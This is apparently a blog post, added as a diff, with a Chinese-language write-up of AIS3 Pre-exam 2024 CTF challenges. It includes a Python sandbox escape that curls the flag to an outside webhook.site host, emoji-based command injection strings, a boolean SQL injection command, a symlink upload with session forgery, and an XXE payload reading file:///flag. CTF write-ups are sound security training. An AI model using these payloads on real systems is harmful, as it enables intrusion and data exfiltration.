@@ -1,0 +1,352 @@
+---
+layout: post
+title: "[CTF] AIS3-Pre-exam-2024 Writeup"
+date: 2024-05-30 +0800
+categories: CTF
+hidden: false
+---
+
+## AIS3 pre-exam 2024
+### Evil Calculator
+- expression 有過濾`_`
+- 無法直接回顯，可用curl帶出
+```
+{"expression":"eval(data['test'])",
+"test":"''.__class__.__base__.__subclasses__()[154].__init__.__globals__['system']('curl https://webhook.site/49d52fa6-4db9-4ad8-8b6e-ee41224137b0 -d $(cat /flag)')"}
+```
+
+![](/images/2024/05/SkywNWyVC.png)
+
+![](/images/2024/05/rJmON-1VC.png)
+
+
+### The Long Print
+
+- 用ghidra patch掉sleep()
+
+![](/images/2024/05/S1fflXJE0.png)
+
+### Three Dimensional Secret
+
+[https://nraynaud.github.io/webgcode/](https://nraynaud.github.io/webgcode/)
+
+![](/images/2024/05/r1cc57kVA.png)
+
+### Quantum Nim Heist
+
+- 按下3，可以強制讓電腦走一步
+![](/images/2024/05/H1I594yNA.png)
+
+### Emoji Console
+
+- source code
+
+```python
+#!/usr/local/bin/python3
+
+import os
+from flask import Flask,send_file,request,redirect,jsonify,render_template
+import json
+import string
+def translate(command:str)->str:
+    emoji_table = json.load(open('emoji.json','r',encoding='utf-8'))
+    for key in emoji_table:
+        if key in command:
+            command = command.replace(key,emoji_table[key])
+    return command.lower()
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/api')
+def api():
+    command = request.args.get('command')
+
+    if len(set(command).intersection(set(string.printable.replace(" ",''))))>0:
+        return jsonify({'command':command,'result':'Invalid command'})
+    command = translate(command)
+    result = os.popen(command+" 2>&1").read()
+    return jsonify({'command':command,'result':result})
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0',5000)
+
+{
+    "😐": ":|",
+    "🤬": "#$%&!",
+    "💿": "CD",
+    "⭐": "*",
+    "🐱": "cat",
+    "😓": ";/",
+    "🚩": "flag",
+    }
+```
+
+- 方法1
+
+- 因為分號截斷之後，&讓後面背景執行，!不影響執行
+
+```
+cd flag ;/:$#$%&! cat *
+```
+
+![](/images/2024/05/H1tjPUyEA.png)
+
+```
+cd flag ;/:$#$%&! python *
+```
+
+![](/images/2024/05/rJ4RPI1ER.png)
+
+- 方法2
+
+
+- 執行cd flag，然後執行 p: 再把輸出餵給 cat *
+
+```
+cd flag;p:| python *
+```
+![](/images/2024/05/HJX5u81NC.png)
+
+### It's MyGO!!!!!
+
+- boolean sql injection
+
+    ```
+    python2 mysql-truefalse.py  -u "http://chals1.ais3.org:11454/song?id=4 and 1=1" -f "/flag"
+    ```
+
+- 1=1
+![](/images/2024/05/r11I0ckVR.png)
+- 1=2
+![](/images/2024/05/BydI0cJ4C.png)
+
+- https://github.com/agix/My-SQL-boolean-based-injection-tools
+
+  ![](/images/2024/05/HkaAAqJVA.png)
+
+### It's MyGO!!!!! Part-time Worker
+
+- 上傳 `ln -s /app`
+ ![](/images/2024/05/ByTyin1ER.png)
+
+- 但是在上傳之前，要先隨便傳一張照片，拿現在的session的網址，不然會因為/app檔案太多(包含全部人session的檔案)，直接當掉。
+
+  ![](/images/2024/05/H1Q-h314C.png)
+
+
+- 可以直接連結到 `/app`
+ ![](/images/2024/05/Hk3Qi214A.png)
+
+- 可以看到前面有import secret，發現secret key
+![](/images/2024/05/SyJSj3JNC.png)
+
+- 根據code，加上Admin
+
+![](/images/2024/05/BkH932J4C.png)
+
+
+![](/images/2024/05/S1gN33JER.png)
+
+
+- 傳送packet
+![](/images/2024/05/SkyLhhyE0.png)
+
+### 火拳のエース
+
+- 大致上是一開始有4段buffer，每段8個字的flag
+- 先去和一些hex做XOR
+
+![](/images/2024/05/SJZkvPgVR.png)
+
+- 再去做complex_function，比對是否為
+
+![](/images/2024/05/BkaGvveNC.png)
+
+
+- main func
+
+![](/images/2024/05/S1zKLDgE0.png)
+
+- `decode.py`
+
+```python
+a = "DHLIYJEG"
+b = "MZRERYND"
+c = "RUYODBAH"
+d = "BKEMPBRE"
+
+a1 = "\x0E\x0D\x7D\x06\x0F\x17\x76\x04"
+a2 = "\x6d\x00\x1b\x7c\x6c\x13\x62\x11"
+a3 = "\x1E\x7E\x06\x13\x07\x66\x0E\x71"
+a4 = "\x17\x14\x1D\x70\x79\x67\x74\x33"
+
+
+
+def complex_function(value1, value2):
+    temp2 = 0
+    temp1 = 0
+
+    if 63 < value1 < 90:
+        temp2 = (value1 + -0x41 + value2 * 0x11) % 0x1a
+        temp1 = value2 % 3 + 3
+        value2 = value2 % 3
+        if value2 == 2:
+            temp2 = ((temp2 - temp1) + 0x1a) % 0x1a
+        elif value2 < 3:
+            if value2 == 0:
+                temp2 = (temp2 * temp1 + 7) % 0x1a
+            elif value2 == 1:
+                temp2 = (temp1 * 2 + temp2) % 0x1a
+
+    return temp2 + 0x41
+
+print("AIS3{G0D")
+
+ans1= ""
+for i in range(8):
+    for value1 in range(64,90,1):
+        ans = complex_function(value1,0x0+i)
+        ans = chr(ans)
+        if(a[i]==ans):
+            ans1 = ans1 + chr(value1)
+
+for i in range(8):
+    test= ans1
+    ans = ord(test[i]) ^ ord(a1[i])
+    print(chr(ans),end='')
+print()
+
+ans2= ""
+for i in range(8):
+    for value1 in range(64,90,1):
+        ans = complex_function(value1,0x20+i)
+        ans = chr(ans)
+        if(b[i]==ans):
+            ans2 = ans2 + chr(value1)
+
+for i in range(8):
+    test= ans2
+    ans = ord(test[i]) ^ ord(a2[i])
+    print(chr(ans),end='')
+print()
+
+ans3 = ""
+for i in range(8):
+    for value1 in range(64,90,1):
+        ans = complex_function(value1,0x40+i)
+        ans = chr(ans)
+        if(c[i]==ans):
+            ans3  = ans3  + chr(value1)
+
+for i in range(8):
+    test= ans3
+    ans = ord(test[i]) ^ ord(a3[i])
+    print(chr(ans),end='')
+print()
+
+ans4 = ""
+for i in range(8):
+    for value1 in range(64,90,1):
+        ans = complex_function(value1,0x60+i)
+        ans = chr(ans)
+        if(d[i]==ans):
+            ans4  = ans4  + chr(value1)
+
+for i in range(8):
+    test= ans4
+    ans = ord(test[i]) ^ ord(a4[i])
+    print(chr(ans),end='')
+print()
+```
+
+![](/images/2024/05/ByTdUVbNC.png)
+
+
+
+### Ebook Parser
+
+- XXE
+
+{% raw %}
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///flag" >]>
+<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
+<description>
+    <title-info>
+        <genre>antique</genre>
+        <author><first-name></first-name><last-name>&xxe;</last-name></author>
+        <book-title>&xxe;</book-title>
+        <lang>&xxe;</lang>
+    </title-info>
+    <document-info>
+        <author><first-name></first-name><last-name>Unknown</last-name></author>
+        <program-used>calibre 6.13.0</program-used>
+        <date>26.5.2024</date>
+        <id>eb5cbf82-22b5-4331-8009-551a95342ea0</id>
+        <version>1.0</version>
+    </document-info>
+    <publish-info>
+    </publish-info>
+</description>
+<body>
+<section>
+<p>&lt;root&gt;</p>
+<p>12345</p>
+<p>&lt;/root&gt;</p>
+</section>
+</body>
+
+</FictionBook>
+```
+{% endraw %}
+
+![](/images/2024/05/SJEp8y-VC.png)
+
+### Hash Guesser
+
+- 答案就在https://github.com/python-pillow/Pillow/issues/2982
+
+- ImageChops.difference
+    - 需要相同的mode ('L')
+    - 它只計算大小子集圖像的差異，例如一張10x10和1x1，只會輸出1x1的不同
+    - 因此只要上傳一張1x1的mode('L')的黑色圖片
+
+- 題目只有黑白，因此每次上傳都有1/2機會。
+
+- 驗證的code
+
+```python
+from PIL import Image, ImageChops
+import hashlib,secrets
+
+img = Image.open('test2.png')
+img = img.convert('L')
+#img.save("testaaaaaaa.png","png")
+
+h = hashlib.sha256(secrets.token_bytes(16)).hexdigest()
+image = Image.new("L", (16, 16), 0)
+pixels = [255 if c == '1' else 0 for c in bin(int(h, 16))[2:].zfill(256)]
+image.putdata(pixels)
+
+print(img)
+print(image)
+
+diff = ImageChops.difference(image, img)
+print(diff)
+print(diff.getbbox())
+```
+
+![](/images/2024/05/rygb37bN0.png)
+
+## End
+
+ - 15/328
+
+![](/images/2024/05/ryZpNyQNA.png)
